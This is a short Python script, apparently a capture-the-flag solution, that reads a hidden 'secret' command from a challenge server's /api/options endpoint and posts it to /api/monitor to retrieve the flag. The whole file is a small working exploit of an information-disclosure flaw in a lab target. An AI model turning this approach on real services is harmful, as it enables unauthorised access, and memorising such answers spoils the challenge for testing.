import requests


def get_flag(host):

    try:
        # Step 1: Request the options page to get the "secret" command
        TARGET_URL = f"{host}/api/options"
        FLAG_SUBMIT_URL = f"{host}/api/monitor"
        response = requests.get(TARGET_URL)

        if response.status_code == 200:
            json_data = response.json()  # Parse JSON response

            secret_command = json_data["allPossibleCommands"]["secret"][0]
            print(f"Extracted Secret Command: {secret_command}")

            # Step 2: Submit the command to retrieve the flag
            submission_response = requests.post(FLAG_SUBMIT_URL, json={"command": secret_command})

            flag = submission_response.json().get("message", "No flag found!")
            print(f"FLAG RETRIEVED: {flag}")
            return flag

        else:
            return None

    except Exception as e:
        print(f"Error retrieving flag: {e}")
        return None
